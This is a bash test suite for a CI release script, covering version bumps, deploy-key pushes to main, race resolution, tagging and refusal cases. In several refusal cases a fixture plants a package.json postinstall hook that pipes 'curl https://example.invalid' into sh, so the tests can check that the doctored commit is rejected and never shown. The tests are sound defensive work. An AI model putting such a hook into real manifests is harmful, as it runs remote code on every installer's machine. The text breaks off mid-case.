#!/usr/bin/env bash
# Tests for `release-push.sh version`, the one version step every build job
# calls: the tag an earlier attempt pushed, the bump release-bump.sh computes
# since the newest tag, the npm fallback for a first release, --expect and the
# refusals; for `release-push.sh push-main`: the version-bump push through the
# deploy key, its same-package race resolution (LEGION-75) and its re-run
# cases; for `release-push.sh tagged`, which finds the tag an earlier attempt
# pushed and refuses one whose name is not <prefix>X.Y.Z; for `release-push.sh
# tag`, which commits the bump and tags it, pushing nothing; for
# `release-push.sh release`, which makes a GitHub release carry the run's
# assets; for `release-push.sh push-tag`, which pushes a tag with the deploy
# key; for `release-push.sh handed`, which checks the version and the files a
# build job hands a publish job and prints the release tag; and for
# `release-push.sh no-credential`, the build job's tripwire.
#
# Each push-main case builds a bare origin holding one seed commit
# (packages/pkg at 1.0.0 plus a README) and two clones, a and b. Clone a plays
# the release run whose bump commit already landed on main; clone b plays the
# next run of the same package, whose checkout predates that bump — so b's push
# is rejected and its rebase meets a's change on the same "version" line. In
# the re-run cases, b plays a later attempt of a's run or of an older run; in
# the refusal cases, b's HEAD carries a branch commit beside the bump, a bump
# that changes a second file, a manifest-only commit that changes more than the
# version (on main's tip, or on an older main commit, before any rebase), or a
# merge commit over main's tip — or is a root commit with no parent — each of
# which push-main refuses before any push. A
# pre-receive hook that always rejects forces the exhaustion case. push-main
# reaches origin as push-tag does: through the deploy key, with the GitHub URL
# rewritten to the local origin by GIT_CONFIG_*, so the key directory is all
# the script makes, and a recording hook sees what it held during the push.
# The `tagged` cases build the commits and tags release runs leave in clone a
# and read them from several checkouts. The `version` cases build the same on
# another origin and run the version step from each checkout, with a stub `npm`
# first on PATH for the first-release fallback. The `tag` cases rewrite the
# manifest and run `tag` against an origin that must end up without the tag.
# The `release` cases run against a stub `gh` first on PATH, which answers `gh
# release view` for a release that does not exist, is a draft or is published,
# can fail an upload, an edit or a create, and logs every call it gets. The
# `push-tag` cases push to a local bare origin through a URL rewrite, and two
# more reach github.com itself: one with the pinned host keys, one with a copy
# of the script whose pinned key GitHub does not hold. Those, and a comparison
# of the pinned keys with `gh api meta`, print a SKIP line and count nothing
# when the network or a gh sign-in is missing. The `handed` cases fill a
# directory with the archives a release ships, change one thing as a
# compromised build job could, and run `handed` on it. The `no-credential`
# cases run it under `env -i` with a throwaway HOME, plant one credential at a
# time, and check it is named but never shown.
#
# Run from anywhere: .github/scripts/release-push.test.sh
# CI runs it in the Tests workflow (pr-and-main.yaml, job test).
set -euo pipefail
# Hermetic: the developer's global/system git config (commit.gpgsign,
# core.hooksPath, rerere, rebase.*) must not reach the seed repos or the script
# under test. Needs git >= 2.32.
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
# `version --expect` names the run to re-run from GITHUB_RUN_ID; the cases set it themselves.
unset GITHUB_RUN_ID

script_dir=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
release_push="$script_dir/release-push.sh"
work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT

# shellcheck source=.github/scripts/test-lib.sh
source "$script_dir/test-lib.sh"

identity() {
  git -C "$1" config user.name "release test"
  git -C "$1" config user.email "release-test@example.com"
}

# setup <dir>: bare origin at <dir>/origin.git holding the seed commit, and
# clones <dir>/a and <dir>/b of it, both still at the seed commit.
setup() {
  local dir=$1
  mkdir -p "$dir/seed/packages/pkg"
  git init -q -b main "$dir/seed"
  identity "$dir/seed"
  printf '{\n  "name": "pkg",\n  "version": "1.0.0"\n}\n' > "$dir/seed/packages/pkg/package.json"
  printf 'seed line\n' > "$dir/seed/README.md"
  git -C "$dir/seed" add -A
  git -C "$dir/seed" commit -q -m "seed"
  git clone -q --bare "$dir/seed" "$dir/origin.git"
  git clone -q "$dir/origin.git" "$dir/a"
  git clone -q "$dir/origin.git" "$dir/b"
  identity "$dir/a"
  identity "$dir/b"
}

# set_version <clone> <version>: rewrite the manifest's .version with jq, as
# the workflow's "Set release version" step does.
set_version() {
  jq --arg v "$2" '.version = $v' "$1/packages/pkg/package.json" > "$1/tmp.json" \
    && mv "$1/tmp.json" "$1/packages/pkg/package.json"
}

# bump <clone> <version>: what the workflow's "Set release version" step and
# `release-push.sh tag` do together — rewrite .version and commit it (together
# with anything the case already staged).
bump() {
  local clone=$1 v=$2
  set_version "$clone" "$v"
  git -C "$clone" add packages/pkg/package.json
  git -C "$clone" commit -q -m "chore: release pkg v$v [skip ci]"
}

# change <clone> <path> <subject>: a commit with <subject> that appends a line
# to <path>, creating it as needed.
change() {
  local clone=$1 path=$2 subject=$3
  mkdir -p "$(dirname "$clone/$path")"
  printf '%s\n' "$subject" >> "$clone/$path"
  git -C "$clone" add "$path"
  git -C "$clone" commit -q -m "$subject"
}

# The deploy key push-main and push-tag push with. The script under test writes
# it under TMPDIR; each case gives it a fresh one and checks it is left empty.
ssh-keygen -q -t ed25519 -N '' -C release-push-test -f "$work/deploy"

# record_hook <origin.git>: a pre-receive hook that records what TMPDIR held
# while the push ran (mode and name of each file, sorted) in $PUSH_SEEN, and
# rejects the push when PUSH_REJECT is set.
record_hook() {
  cat > "$1/hooks/pre-receive" <<'HOOK'
#!/usr/bin/env bash
find "$TMPDIR" -type f -printf '%m %f\n' | sort > "$PUSH_SEEN"
[ -z "${PUSH_REJECT:-}" ]
HOOK
  chmod +x "$1/hooks/pre-receive"
}

# push_main <clone> <version> [summary-file] [VAR=value...]: runs the script
# under test from <clone> with the deploy key, a fresh TMPDIR and the GitHub URL
# rewritten to the case's origin, <clone>/../origin.git, so git pushes locally;
# leaves its exit code in rc, its combined output in out, what a recording hook
# saw in seen and what TMPDIR holds afterwards in left.
push_main() {
  local clone=$1 v=$2 summary=${3:-} dir
  dir=$(dirname "$clone")
  shift 2
  [ $# -eq 0 ] || shift
  rm -rf "$dir/tmp" && mkdir "$dir/tmp"
  : > "$dir/seen"
  set +e
  out=$(cd "$clone" && env TMPDIR="$dir/tmp" PUSH_SEEN="$dir/seen" GITHUB_STEP_SUMMARY="$summary" \
    GITHUB_REPOSITORY=example/repo DEPLOY_KEY="$(<"$work/deploy")" GIT_CONFIG_COUNT=1 \
    GIT_CONFIG_KEY_0="url.$dir/origin.git.insteadOf" GIT_CONFIG_VALUE_0="git@github.com:example/repo.git" \
    "$@" "$release_push" push-main packages/pkg "$v" 2>&1)
  rc=$?
  set -e
  seen=$(<"$dir/seen")
  left=$(find "$dir/tmp" -mindepth 1 | wc -l)
}

# tagged <clone> <tag-prefix> [<package-dir>]: runs the script under test's
# `tagged` from <clone>; leaves its exit code in rc, its stdout (the tag the
# version step reads) in out and its stderr in err.
tagged() {
  local clone=$1
  shift
  set +e
  out=$(cd "$clone" && "$release_push" tagged "$@" 2>"$work/tagged.err")
  rc=$?
  set -e
  err=$(<"$work/tagged.err")
}

origin_version() { git -C "$1/origin.git" show main:packages/pkg/package.json | jq -r .version; }
origin_tip_subject() { git -C "$1/origin.git" log -1 --format=%s main; }
release_commits() { git -C "$1/origin.git" log --format=%s main | { grep -c '^chore: release' || true; }; }
not_rebasing() { [ ! -d "$1/.git/rebase-merge" ] && [ ! -d "$1/.git/rebase-apply" ] && echo true || echo false; }

echo "Case 1: two releases of one package race on the version line"
setup "$work/c1"
# a's bump also changes another key, so the resolution must keep main's copy of
# the file (HEAD at the rebase stop), not just replay b's version line.
jq '.description = "set on main by a"' "$work/c1/a/packages/pkg/package.json" > "$work/c1/a/tmp.json" \
  && mv "$work/c1/a/tmp.json" "$work/c1/a/packages/pkg/package.json"
bump "$work/c1/a" 1.0.1
git -C "$work/c1/a" push -q origin main
bump "$work/c1/b" 1.0.2
push_main "$work/c1/b" 1.0.2
check "push-main exits 0" "$(is "$rc" 0)"
check "origin/main holds the higher version" "$(is "$(origin_version "$work/c1")" 1.0.2)"
check "origin/main keeps main's other change to the manifest" "$(is "$(git -C "$work/c1/origin.git" show main:packages/pkg/package.json | jq -r .description)" "set on main by a")"
check "origin/main has one bump commit per release" "$(is "$(release_commits "$work/c1")" 2)"
check "the rebased bump commit keeps its message" "$(is "$(origin_tip_subject "$work/c1")" "chore: release pkg v1.0.2 [skip ci]")"
check "clone is not left mid-rebase" "$(not_rebasing "$work/c1/b")"

echo
echo "Case 2: a HEAD carrying a commit besides the bump is refused before any push"
# A workflow_dispatch from a branch checks out that branch; its commits must
# not reach main through the deploy key.
setup "$work/c2"
record_hook "$work/c2/origin.git"
change "$work/c2/b" README.md "feat: on the branch"
bump "$work/c2/b" 1.0.1
push_main "$work/c2/b" 1.0.1 "$work/c2/summary.md"
check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "error counts the commits HEAD carries over main" "$(contains "$out" '^::error::HEAD carries 2 commits main does not')"
check "error lists each commit, short sha and subject" "$(contains "$out" '^::error::HEAD carries 2 commits main does not .* [0-9a-f]* chore: release pkg v1\.0\.1 \[skip ci\]; [0-9a-f]* feat: on the branch .* and push-main pushes the one version-bump commit')"
check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
check "job summary says the same" "$(contains "$(cat "$work/c2/summary.md" 2>/dev/null)" 'HEAD carries 2 commits main does not.*feat: on the branch.*The release itself succeeded.*only this version-bump push to main is outstanding')"
check "nothing was pushed" "$(is "$seen" "")"
check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2")" 1.0.0)"
check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2")" seed)"
check "clone is not left mid-rebase" "$(not_rebasing "$work/c2/b")"

echo
echo "Case 2b: a bump commit that changes a second file is refused before any push"
setup "$work/c2b"
record_hook "$work/c2b/origin.git"
printf 'from b\n' > "$work/c2b/b/README.md"
git -C "$work/c2b/b" add README.md
bump "$work/c2b/b" 1.0.1
push_main "$work/c2b/b" 1.0.1
check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "error names the paths the one commit changes" "$(contains "$out" '^::error::HEAD carries 1 commit main does not .* chore: release pkg v1\.0\.1 \[skip ci\] .* which changes README\.md packages/pkg/package\.json, and push-main pushes the one version-bump commit, which changes only packages/pkg/package\.json,')"
check "nothing was pushed" "$(is "$seen" "")"
check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2b")" 1.0.0)"
check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2b")" seed)"

echo
echo "Case 2c: a manifest-only commit at the release version that carries more than the version is refused"
# A branch whose one commit over main's tip already holds the release version:
# "Set release version" changes nothing, `tag` commits nothing, and that commit
# is what push-main sees as the bump. Whatever else the file carries must not
# land, and must not be shown.
setup "$work/c2c"
record_hook "$work/c2c/origin.git"
jq '.version = "1.0.1" | .scripts.postinstall = "curl https://example.invalid | sh"' "$work/c2c/b/packages/pkg/package.json" > "$work/c2c/b/tmp.json" \
  && mv "$work/c2c/b/tmp.json" "$work/c2c/b/packages/pkg/package.json"
git -C "$work/c2c/b" add packages/pkg/package.json
git -C "$work/c2c/b" commit -q -m "feat: a release the author bumped"
push_main "$work/c2c/b" 1.0.1 "$work/c2c/summary.md"
check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "error says the manifest differs from its parent's in more than the version" "$(contains "$out" "^::error::HEAD's packages/pkg/package\.json differs from its parent's in more than \.version = 1\.0\.1\. push-main pushes the one version-bump commit")"
check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
check "job summary says the same" "$(contains "$(cat "$work/c2c/summary.md" 2>/dev/null)" "differs from its parent's in more than \.version = 1\.0\.1.*The release itself succeeded.*only this version-bump push to main is outstanding")"
check "the output never shows the manifest's content" "$(is "$(contains "$out" 'example\.invalid\|postinstall')" false)"
check "nothing was pushed" "$(is "$seen" "")"
check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2c")" 1.0.0)"
check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2c")" seed)"

echo
echo "Case 2d: a manifest-only commit at the release version that changes nothing but the version lands"
# The exact bump, authored on the branch under the author's own subject: what a
# run from main would land, so parity lets it through.
setup "$work/c2d"
record_hook "$work/c2d/origin.git"
set_version "$work/c2d/b" 1.0.1
git -C "$work/c2d/b" add packages/pkg/package.json
git -C "$work/c2d/b" commit -q -m "feat: a release the author bumped"
push_main "$work/c2d/b" 1.0.1
check "push-main exits 0" "$(is "$rc" 0)"
check "origin/main holds the version" "$(is "$(origin_version "$work/c2d")" 1.0.1)"
check "origin/main's tip is the author's commit" "$(is "$(origin_tip_subject "$work/c2d")" "feat: a release the author bumped")"
check "the push went through the deploy key" "$(is "$seen" "600 key"$'\n'"600 known_hosts")"

echo
echo "Case 2e: a merge commit over main's tip is refused, even one carrying only the bump"
# Its first parent is the seed, its second main's tip, its tree the seed's plus
# the bump: one commit main does not have, changing only the manifest against
# its first parent, whose push would fast-forward main back to the seed's tree.
setup "$work/c2e"
change "$work/c2e/a" src/guard.js "feat: guard"
git -C "$work/c2e/a" push -q origin main
record_hook "$work/c2e/origin.git"
tip=$(git -C "$work/c2e/origin.git" rev-parse main)
git -C "$work/c2e/b" fetch -q origin main
# `ours` never fast-forwards; --no-commit leaves the merge open for the bump
# (its "stopped before committing" note goes to stderr).
git -C "$work/c2e/b" merge -s ours --no-commit FETCH_HEAD >/dev/null 2>&1
set_version "$work/c2e/b" 1.0.1
git -C "$work/c2e/b" add packages/pkg/package.json
git -C "$work/c2e/b" commit -q -m "chore: release pkg v1.0.1 [skip ci]"
check "the merge commit's parents are the seed and main's tip" \
  "$(is "$(git -C "$work/c2e/b" log -1 --format=%P HEAD)" "$(git -C "$work/c2e/origin.git" rev-parse main^) $tip")"
check "the merge commit changes only the manifest against its first parent" \
  "$(is "$(git -C "$work/c2e/b" diff --name-only HEAD^ HEAD)" packages/pkg/package.json)"
push_main "$work/c2e/b" 1.0.1 "$work/c2e/summary.md"
check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "error says HEAD has two parents" "$(contains "$out" '^::error::HEAD [0-9a-f]* has 2 parents; the version-bump commit has one\. push-main pushes the one version-bump commit')"
check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
check "job summary says the same" "$(contains "$(cat "$work/c2e/summary.md" 2>/dev/null)" 'has 2 parents.*The release itself succeeded.*only this version-bump push to main is outstanding')"
check "nothing was pushed" "$(is "$seen" "")"
check "origin/main's tip is still main's own" "$(is "$(git -C "$work/c2e/origin.git" rev-parse main)" "$tip")"
check "origin/main still holds the file the merge would have dropped" "$(git -C "$work/c2e/origin.git" cat-file -e main:src/guard.js && echo true || echo false)"
check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2e")" 1.0.0)"

echo
echo "Case 2f: a parentless HEAD is refused through the error sink"
# A repository of one root commit holding the manifest at the release version:
# it is one commit main does not have, and reading HEAD^ would die with git's
# bare fatal, outside the ::error:: and the summary.
setup "$work/c2f"
record_hook "$work/c2f/origin.git"
mkdir -p "$work/c2f/root/packages/pkg"
git init -q -b main "$work/c2f/root"
identity "$work/c2f/root"
git -C "$work/c2f/root" remote add origin "$work/c2f/origin.git"
printf '{\n  "name": "pkg",\n  "version": "1.0.1"\n}\n' > "$work/c2f/root/packages/pkg/package.json"
git -C "$work/c2f/root" add -A
git -C "$work/c2f/root" commit -q -m "chore: release pkg v1.0.1 [skip ci]"
push_main "$work/c2f/root" 1.0.1 "$work/c2f/summary.md"
check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "error says HEAD has no parent" "$(contains "$out" '^::error::HEAD [0-9a-f]* has 0 parents; the version-bump commit has one\.')"
check "no bare git fatal reaches the log" "$(is "$(contains "$out" '^fatal: ')" false)"
check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
check "job summary says the same" "$(contains "$(cat "$work/c2f/summary.md" 2>/dev/null)" 'has 0 parents.*The release itself succeeded.*only this version-bump push to main is outstanding')"
check "nothing was pushed" "$(is "$seen" "")"
check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2f")" 1.0.0)"
check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2f")" seed)"

echo
echo "Case 2g: the doctored manifest-only commit of 2c on a stale branch is refused before any rebase"
# main moved on after the checkout, so the commit's parent is an older main
# commit. The content checks run against that parent before the rebase that
# would carry the commit onto main's tip, so it is refused where it stands.
setup "$work/c2g"
change "$work/c2g/a" src/guard.js "feat: guard"
git -C "$work/c2g/a" push -q origin main
record_hook "$work/c2g/origin.git"
tip=$(git -C "$work/c2g/origin.git" rev-parse main)
seed=$(git -C "$work/c2g/b" rev-parse HEAD)
jq '.version = "1.0.1" | .scripts.postinstall = "curl https://example.invalid | sh"' "$work/c2g/b/packages/pkg/package.json" > "$work/c2g/b/tmp.json" \
  && mv "$work/c2g/b/tmp.json" "$work/c2g/b/packages/pkg/package.json"
git -C "$work/c2g/b" add packages/pkg/package.json
git -C "$work/c2g/b" commit -q -m "feat: a release the author bumped"
check "the commit's parent is the seed, which main has moved past" "$([ "$(git -C "$work/c2g/b" rev-parse HEAD^)" = "$seed" ] && [ "$seed" != "$tip" ] && echo true || echo false)"
push_main "$work/c2g/b" 1.0.1 "$work/c2g/summary.md"
check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "error says the manifest differs from its parent's in more than the version" "$(contains "$out" "^::error::HEAD's packages/pkg/package\.json differs from its parent's in more than \.version = 1\.0\.1\. push-main pushes the one version-bump commit")"
check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
check "job summary says the same" "$(contains "$(cat "$work/c2g/summary.md" 2>/dev/null)" "differs from its parent's in more than \.version = 1\.0\.1.*The release itself succeeded.*only this version-bump push to main is outstanding")"
check "the output never shows the manifest's content" "$(is "$(contains "$out" 'example\.invalid\|postinstall')" false)"
check "no rebase was started" "$(not_rebasing "$work/c2g/b")"
check "HEAD still sits on the seed, not rebased onto main's tip" "$(is "$(git -C "$work/c2g/b" rev-parse HEAD^)" "$seed")"
check "nothing was pushed" "$(is "$seen" "")"
check "origin/main's tip is still main's own" "$(is "$(git -C "$work/c2g/origin.git" rev-parse main)" "$tip")"
check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2g")" 1.0.0)"

# The same commit when main already holds the version: the rebase path would
# drop it whole with the superseded-version notice, so the checks must refuse
# it before that exit.
setup "$work/c2g-held"
bump "$work/c2g-held/a" 1.0.1
git -C "$work/c2g-held/a" push -q origin main
record_hook "$work/c2g-held/origin.git"
tip=$(git -C "$work/c2g-held/origin.git" rev-parse main)
jq '.version = "1.0.1" | .scripts.postinstall = "curl https://example.invalid | sh"' "$work/c2g-held/b/packages/pkg/package.json" > "$work/c2g-held/b/tmp.json" \
  && mv "$work/c2g-held/b/tmp.json" "$work/c2g-held/b/packages/pkg/package.json"
git -C "$work/c2g-held/b" add packages/pkg/package.json
git -C "$work/c2g-held/b" commit -q -m "feat: a release the author bumped"
push_main "$work/c2g-held/b" 1.0.1 "$work/c2g-held/summary.md"
check "main already at the version: push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "main already at the version: error says the manifest differs from its parent's" "$(contains "$out" "^::error::HEAD's packages/pkg/package\.json differs from its parent's in more than \.version = 1\.0\.1\.")"
check "main already at the version: no superseded-version notice, the commit is refused, not dropped" "$(is "$(contains "$out" '::notice title=Version bump not pushed')" false)"
check "main already at the version: the output never shows the manifest's content" "$(is "$(contains "$out" 'example\.invalid\|postinstall')" false)"
check "main already at the version: no rebase was started" "$(not_rebasing "$work/c2g-held/b")"
check "main already at the version: nothing was pushed" "$(is "$seen" "")"
check "main already at the version: origin/main's tip is still a's bump" "$(is "$(git -C "$work/c2g-held/origin.git" rev-parse main)" "$tip")"

echo
echo "Case 3: five rejections fail, saying the release succeeded and only the push is outstanding"
setup "$work/c3"
printf '#!/bin/sh\necho "rejected by test hook" >&2\nexit 1\n' > "$work/c3/origin.git/hooks/pre-receive"
chmod +x "$work/c3/origin.git/hooks/pre-receive"
bump "$work/c3/b" 1.0.1
push_main "$work/c3/b" 1.0.1 "$work/c3/summary.md"
check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "push was attempted exactly five times" "$(is "$(printf '%s\n' "$out" | grep -c 'rejected by test hook')" 5)"
check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
check "error says only the version-bump push is outstanding" "$(contains "$out" 'only this version-bump push to main is outstanding')"
check "job summary says the same" "$(contains "$(cat "$work/c3/summary.md" 2>/dev/null)" 'The release itself succeeded.*only this version-bump push to main is outstanding')"
check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c3")" 1.0.0)"

echo
echo "Case 4: a release of another package racing in still rebases cleanly"
setup "$work/c4"
mkdir -p "$work/c4/a/packages/other"
printf '{\n  "name": "other",\n  "version": "2.0.1"\n}\n' > "$work/c4/a/packages/other/package.json"
git -C "$work/c4/a" add -A
git -C "$work/c4/a" commit -q -m "chore: release other v2.0.1 [skip ci]"
git -C "$work/c4/a" push -q origin main
bump "$work/c4/b" 1.0.1
push_main "$work/c4/b" 1.0.1
check "push-main exits 0" "$(is "$rc" 0)"
check "origin/main holds the bump" "$(is "$(origin_version "$work/c4")" 1.0.1)"
check "origin/main has both release commits" "$(is "$(release_commits "$work/c4")" 2)"

echo
echo "Case 5: an unreachable origin fails through the same message"
setup "$work/c5"
bump "$work/c5/b" 1.0.1
# The GitHub URL rewritten to a path that does not exist.
push_main "$work/c5/b" 1.0.1 "$work/c5/summary.md" GIT_CONFIG_KEY_0="url.$work/c5/nowhere.git.insteadOf"
check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "error names the fetch" "$(contains "$out" '^::error::Fetching main from origin failed on attempt 1\.')"
check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
check "job summary says the same" "$(contains "$(cat "$work/c5/summary.md" 2>/dev/null)" 'The release itself succeeded.*only this version-bump push to main is outstanding')"
check "clone is not left mid-rebase" "$(not_rebasing "$work/c5/b")"

echo
echo "Case 6: the manifest deleted on main is a real divergence, not resolved"
setup "$work/c6"
git -C "$work/c6/a" rm -q -r packages/pkg
git -C "$work/c6/a" commit -q -m "a: remove pkg"
git -C "$work/c6/a" push -q origin main
bump "$work/c6/b" 1.0.1
push_main "$work/c6/b" 1.0.1
check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "error names the manifest as the conflict" "$(contains "$out" '^::error::.*conflicts in: packages/pkg/package\.json\.')"
check "rebase was aborted" "$(not_rebasing "$work/c6/b")"
check "clone's manifest is intact, not truncated" "$(is "$(jq -r .version "$work/c6/b/packages/pkg/package.json")" 1.0.1)"
check "origin/main is untouched" "$(is "$(origin_tip_subject "$work/c6")" "a: remove pkg")"

echo
echo "Case 7: a re-run whose first attempt already landed its bump pushes nothing"
setup "$work/c7"
bump "$work/c7/a" 1.0.1
git -C "$work/c7/a" push -q origin main
# The re-run recommits the same bump at a later time, so it is a commit of its own.
GIT_AUTHOR_DATE="2001-01-01T00:00:00Z" GIT_COMMITTER_DATE="2001-01-01T00:00:00Z" bump "$work/c7/b" 1.0.1
check "the re-run's bump is a different commit from main's" "$([ "$(git -C "$work/c7/b" rev-parse HEAD)" != "$(git -C "$work/c7/origin.git" rev-parse main)" ] && echo true || echo false)"
push_main "$work/c7/b" 1.0.1 "$work/c7/summary.md"
check "push-main exits 0" "$(is "$rc" 0)"
check "notice says main already holds the version" "$(contains "$out" "^::notice title=Version bump not pushed::main's packages/pkg/package.json already holds v1\.0\.1")"
check "origin/main holds the version" "$(is "$(origin_version "$work/c7")" 1.0.1)"
check "origin/main has one bump commit, not two" "$(is "$(release_commits "$work/c7")" 1)"
check "clone is not left mid-rebase" "$(not_rebasing "$work/c7/b")"

echo
echo "Case 8: a re-run after a later release of the package landed never lowers main's version"
setup "$work/c8"
bump "$work/c8/a" 1.0.2
git -C "$work/c8/a" push -q origin main
bump "$work/c8/b" 1.0.1
push_main "$work/c8/b" 1.0.1 "$work/c8/summary.md"
check "push-main exits 0" "$(is "$rc" 0)"
check "notice names the later release" "$(contains "$out" "^::notice title=Version bump not pushed::main's packages/pkg/package.json holds v1\.0\.2, a later release than v1\.0\.1")"
check "job summary says the bump was not pushed" "$(contains "$(cat "$work/c8/summary.md" 2>/dev/null)" 'Version bump for packages/pkg v1.0.1 not pushed')"
check "origin/main keeps the later version" "$(is "$(origin_version "$work/c8")" 1.0.2)"
check "origin/main has only the later release's bump commit" "$(is "$(release_commits "$work/c8")" 1)"
check "clone is not left mid-rebase" "$(not_rebasing "$work/c8/b")"

echo
echo "Case 8b: push-main pushes through the deploy key and leaves none behind"
setup "$work/c8b"
record_hook "$work/c8b/origin.git"
bump "$work/c8b/b" 1.0.1
push_main "$work/c8b/b" 1.0.1
check "pushes: exits 0" "$(is "$rc" 0)"
check "pushes: origin/main holds the bump" "$(is "$(origin_version "$work/c8b")" 1.0.1)"
check "pushes: the key and the pinned host keys were owner-only while the push ran" \
  "$(is "$seen" "600 key"$'\n'"600 known_hosts")"
check "pushes: nothing is left in TMPDIR" "$(is "$left" 0)"
setup "$work/c8c"
record_hook "$work/c8c/origin.git"
bump "$work/c8c/b" 1.0.1
push_main "$work/c8c/b" 1.0.1 "" PUSH_REJECT=1
check "five rejections: exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "five rejections: says the push race was lost 5 times" "$(contains "$out" '^::error::.*lost the push race to main 5 times\.')"
check "five rejections: the key and the pinned host keys were owner-only while the pushes ran" \
  "$(is "$seen" "600 key"$'\n'"600 known_hosts")"
check "five rejections: nothing is left in TMPDIR" "$(is "$left" 0)"
check "five rejections: origin/main manifest is untouched" "$(is "$(origin_version "$work/c8c")" 1.0.0)"
setup "$work/c8d"
bump "$work/c8d/b" 1.0.1
push_main "$work/c8d/b" 1.0.1 "$work/c8d/summary.md" DEPLOY_KEY=
check "no DEPLOY_KEY: exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "no DEPLOY_KEY: the error names it and says the release itself succeeded" \
  "$(is "$(contains "$out" '^::error::.*DEPLOY_KEY')|$(contains "$out" 'The release itself succeeded')" 'true|true')"
check "no DEPLOY_KEY: the job summary says the same" \
  "$(contains "$(cat "$work/c8d/summary.md" 2>/dev/null)" 'DEPLOY_KEY.*The release itself succeeded')"
check "no DEPLOY_KEY: origin/main is untouched" "$(is "$(origin_version "$work/c8d")" 1.0.0)"
check "no DEPLOY_KEY: nothing is made in TMPDIR" "$(is "$left" 0)"
push_main "$work/c8d/b" 1.0.1 "$work/c8d/summary.md" GITHUB_REPOSITORY=
check "no GITHUB_REPOSITORY: exits non-zero, naming it, and says the release itself succeeded" \
  "$([ "$rc" != 0 ] && is "$(contains "$out" '^::error::GITHUB_REPOSITORY.*The release itself succeeded')|$left" 'true|0' || echo false)"
# HEAD:refs/heads/main serves a detached HEAD and a branch alike (a release job
# may check out either); the pre-push checks (cases 2 to 2f) are what keep
# everything but the exact bump off main.
setup "$work/c8e"
git -C "$work/c8e/b" checkout -q --detach
bump "$work/c8e/b" 1.0.1
push_main "$work/c8e/b" 1.0.1
check "a detached HEAD: exits 0" "$(is "$rc" 0)"
check "a detached HEAD: origin/main holds the bump" "$(is "$(origin_version "$work/c8e")" 1.0.1)"
check "a detached HEAD: origin/main's tip is the bump commit" \
  "$(is "$(git -C "$work/c8e/origin.git" rev-parse main)" "$(git -C "$work/c8e/b" rev-parse HEAD)")"
# The manifest already held the version, so `tag` committed nothing and HEAD is main's tip.
setup "$work/c8f"
record_hook "$work/c8f/origin.git"
push_main "$work/c8f/b" 1.0.0
check "HEAD already on main: exits 0" "$(is "$rc" 0)"
check "HEAD already on main: says there is nothing to push" "$(contains "$out" '^Nothing to push: main already holds this checkout$')"
check "HEAD already on main: nothing was pushed" "$(is "$seen" "")"
check "HEAD already on main: origin/main is unchanged" \
  "$(is "$(git -C "$work/c8f/origin.git" rev-parse main)" "$(git -C "$work/c8f/b" rev-parse HEAD)")"

echo
echo "Case 9: tagged finds the tag an earlier attempt pushed for this checkout, and only that"
setup "$work/c9"
clone="$work/c9/a"
seed=$(git -C "$clone" rev-parse HEAD)
tagged "$clone" pkg-v packages/pkg
check "no tag: exits 0" "$(is "$rc" 0)"
check "no tag: prints nothing" "$(is "$out" "")"
# What one release run leaves: its bump commit, a child of the checkout, tagged.
bump "$clone" 1.0.1
git -C "$clone" tag pkg-v1.0.1
# Another package's release from the same checkout: a sibling bump, tagged with its own prefix.
git -C "$clone" checkout -q --detach "$seed"
mkdir -p "$clone/packages/other"
printf '{\n  "name": "other",\n  "version": "2.0.1"\n}\n' > "$clone/packages/other/package.json"
git -C "$clone" add -A
git -C "$clone" commit -q -m "chore: release other v2.0.1 [skip ci]"
git -C "$clone" tag other-v2.0.1
git -C "$clone" checkout -q --detach "$seed"
tagged "$clone" pkg-v packages/pkg
check "the tag on HEAD's bump commit: printed" "$(is "$out" pkg-v1.0.1)"
tagged "$clone" pkg-v
check "without a package dir, a tag on HEAD's bump commit is not this checkout's" "$(is "$rc $out" "0 ")"
tagged "$clone" other-v packages/other
check "each prefix finds its own package's tag" "$(is "$out" other-v2.0.1)"
# A later release: main moves past the first bump, and the next run tags its own bump.
git -C "$clone" checkout -q --detach pkg-v1.0.1
printf 'later\n' > "$clone/README.md"
git -C "$clone" commit -q -am "fix: later change"
later=$(git -C "$clone" rev-parse HEAD)
bump "$clone" 1.0.2
git -C "$clone" tag pkg-v1.0.2
git -C "$clone" checkout -q --detach "$seed"
tagged "$clone" pkg-v packages/pkg
check "a later release on a descendant is not this checkout's" "$(is "$out" pkg-v1.0.1)"
git -C "$clone" checkout -q --detach "$later"
tagged "$clone" pkg-v packages/pkg
